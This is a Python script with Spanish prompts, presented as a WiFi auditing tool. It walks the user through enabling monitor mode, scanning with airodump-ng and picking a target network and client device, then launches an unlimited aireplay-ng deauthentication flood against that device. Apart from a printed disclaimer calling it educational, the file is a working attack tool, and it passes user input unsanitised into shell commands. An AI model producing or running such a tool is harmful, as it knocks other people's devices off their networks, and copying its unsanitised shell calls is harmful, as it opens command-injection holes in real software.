#!/usr/bin/env python3

import os
import subprocess

def ejecutar_comando(comando):
    """Ejecuta un comando en el shell."""
    try:
        subprocess.run(comando, shell=True, check=True)
    except subprocess.CalledProcessError:
        print(f"Error al ejecutar el comando: {comando}")

def abrir_en_ventana(comando, titulo=""):
    """Abre un comando en una ventana separada (gnome-terminal)."""
    try:
        subprocess.Popen(f"gnome-terminal -- bash -c \"echo '{titulo}'; {comando}; exec bash\"", shell=True)
    except Exception as e:
        print(f"Error al abrir la ventana: {e}")

def main():
    print("=== Script de Auditoría de Redes WiFi ===")
    print("Nota: Este script es exclusivamente para fines educativos. Asegúrate de tener los permisos adecuados.")
    print("Asegúrate de ejecutarlo como administrador.\n")

    # Verificar el nombre de la tarjeta de red
    print("Verificando tarjetas de red disponibles...")
    ejecutar_comando("iwconfig")
    tarjeta_red = input("\nIntroduce el nombre de la tarjeta de red (ejemplo: wlan0): ").strip()

    # Iniciar modo monitor
    print("\nCambiando la tarjeta de red al modo monitor...")
    ejecutar_comando(f"airmon-ng start {tarjeta_red}")

    # Escanear redes disponibles
    print("\nAbriendo escáner de redes en una nueva ventana...")
    abrir_en_ventana(f"airodump-ng --band a {tarjeta_red}", "Escáner de Redes")
    input("\nObserva la ventana del escáner. Cuando tengas el BSSID y el canal de la red objetivo, vuelve aquí y presiona Enter para continuar.")

    # Solicitar información de la red a auditar
    bssid = input("\nIntroduce el BSSID de la red objetivo: ").strip()
    canal = input("Introduce el canal (CH) de la red objetivo: ").strip()

    # Monitorear la red específica
    print(f"\nAbriendo monitoreo de la red {bssid} en una nueva ventana...")
    abrir_en_ventana(f"airodump-ng --band a -c {canal} --bssid {bssid} {tarjeta_red}", "Monitoreo de Red")
    input("\nObserva la ventana del monitoreo. Cuando identifiques el dispositivo objetivo, vuelve aquí y presiona Enter para continuar.")

    # Solicitar información del dispositivo objetivo
    station = input("\nIntroduce el STATION (dispositivo objetivo): ").strip()

    # Intentar desautenticar el dispositivo
    print(f"\nEnviando desautenticación al dispositivo {station} en una nueva ventana...")
    abrir_en_ventana(f"aireplay-ng -0 0 -a {bssid} -c {station} {tarjeta_red}", "Desautenticación en Proceso")

    print("\nSi este no es el dispositivo deseado, reinicia el script y prueba con otro STATION.\n")

    # Detener modo monitor
    print("Deteniendo el modo monitor y restaurando configuración...")
    ejecutar_comando(f"airmon-ng stop {tarjeta_red}")

    print("\n=== Script finalizado ===")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Este script debe ejecutarse como administrador (sudo).")
        exit(1)
    main()
